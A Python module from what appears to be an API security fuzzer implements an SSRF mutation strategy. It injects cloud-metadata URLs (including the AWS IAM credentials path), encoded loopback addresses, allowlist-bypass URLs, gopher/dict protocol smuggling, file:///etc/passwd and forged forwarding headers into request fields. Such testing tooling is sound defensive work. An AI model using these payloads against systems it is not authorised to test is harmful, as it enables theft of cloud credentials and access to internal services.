from __future__ import annotations

import re
from typing import Any
from typing import Iterator

from rsfuzzer.mutations.strategies.base import _merge_body
from rsfuzzer.mutations.types import MutationTrace

# Keys whose values are commonly treated as fetchable locations server-side.
_URL_KEY = re.compile(
    r"(url|uri|href|link|src|dest|destination|target|callback|webhook|hook|"
    r"endpoint|host|domain|feed|proxy|fetch|image|img|avatar|photo|file|"
    r"document|download|upstream|origin|site|website|address|location|"
    r"resource|remote|server|gateway|api)",
    re.IGNORECASE,
)


def _is_url_key(key: str) -> bool:
    return bool(_URL_KEY.search(key))


def _ssrf_payloads(*, light: bool) -> Iterator[tuple[str, str]]:
    """
    Generate server-side request forgery probes: cloud instance-metadata endpoints,
    loopback in many encodings, internal hostnames, and alternate URL schemes that
    naive URL fetchers/allowlists frequently miss.
    """
    core: list[tuple[str, str]] = [
        ("aws_imds", "http://169.254.169.254/latest/meta-data/"),
        ("aws_imds_creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
        ("localhost_ip", "http://127.0.0.1/"),
        ("localhost_name", "http://localhost/"),
        ("loopback_ipv6", "http://[::1]/"),
        ("all_interfaces", "http://0.0.0.0/"),
        ("file_scheme", "file:///etc/passwd"),
        ("internal_host", "http://internal/"),
    ]
    extra: list[tuple[str, str]] = [
        ("azure_imds", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("alibaba_imds", "http://100.100.100.100/latest/meta-data/"),
        ("decimal_ip", "http://2130706433/"),
        ("octal_ip", "http://0177.0.0.1/"),
        ("hex_ip", "http://0x7f000001/"),
        ("short_ip", "http://127.1/"),
        ("ipv4_mapped_ipv6", "http://[::ffff:127.0.0.1]/"),
        ("userinfo_bypass", "http://expected-host.example.com@127.0.0.1/"),
        ("fragment_bypass", "http://127.0.0.1#@expected-host.example.com/"),
        ("gopher_redis", "gopher://127.0.0.1:6379/_INFO%0d%0a"),
        ("dict_memcached", "dict://127.0.0.1:11211/stats"),
        ("ftp_scheme", "ftp://127.0.0.1/"),
        ("redis_localhost", "http://127.0.0.1:6379/"),
        ("k8s_api", "https://kubernetes.default.svc/"),
        ("encoded_metadata", "http://169.254.169.254%2flatest%2fmeta-data%2f"),
        ("link_local_dns", "http://[fe80::1]/"),
    ]
    for name, payload in (core if light else core + extra):
        yield name, payload


class SsrfStrategy:
    """
    Server-Side Request Forgery (OWASP API7). Targets URL/host-like fields with
    internal/metadata destinations and scheme-smuggling payloads. Also forges
    forwarding headers that some frameworks use to build outbound requests.
    """

    id = "ssrf"
    category = "ssrf"

    def __init__(self, *, light: bool = False) -> None:
        self._light = light

    def mutate_body(
        self,
        body: dict[str, Any] | None,
    ) -> Iterator[tuple[dict[str, Any], MutationTrace]]:
        base = dict(body) if body else {}
        payloads = list(_ssrf_payloads(light=self._light))

        # Always probe a synthetic url-like key so endpoints with no obvious
        # url field still get exercised.
        for name, payload in payloads:
            merged = _merge_body(base, {"_url": payload})
            yield merged, MutationTrace(
                self.id, self.category, {"inject_key": "_url", "probe": name}
            )

        if body:
            url_keys = [k for k in body if _is_url_key(str(k))]
            cap = 2 if self._light else 5
            for key in url_keys[:cap]:
                for name, payload in payloads:
                    clone = dict(body)
                    clone[key] = payload
                    yield clone, MutationTrace(
                        self.id, self.category, {"key": key, "probe": name}
                    )

    def mutate_query(
        self,
        query: dict[str, str],
    ) -> Iterator[tuple[dict[str, str], MutationTrace]]:
        payloads = list(_ssrf_payloads(light=self._light))
        for name, payload in payloads:
            q = dict(query)
            q["_url"] = payload
            yield q, MutationTrace(self.id, self.category, {"param": "_url", "probe": name})

        url_keys = [k for k in query if _is_url_key(str(k))]
        for key in url_keys[: (1 if self._light else 3)]:
            for name, payload in payloads[: (4 if self._light else len(payloads))]:
                q = dict(query)
                q[key] = payload
                yield q, MutationTrace(self.id, self.category, {"param": key, "probe": name})

    def mutate_headers(
        self,
        headers: dict[str, str],
    ) -> Iterator[tuple[dict[str, str], MutationTrace]]:
        forwarding = [
            ("X-Forwarded-Host", "169.254.169.254"),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Forwarded-Server", "localhost"),
            ("Forwarded", "for=127.0.0.1;host=169.254.169.254"),
            ("X-Real-Ip", "127.0.0.1"),
        ]
        if self._light:
            forwarding = forwarding[:3]
        for name, val in forwarding:
            h = dict(headers)
            h[name] = val
            yield h, MutationTrace(self.id, self.category, {"header": name, "value": val})
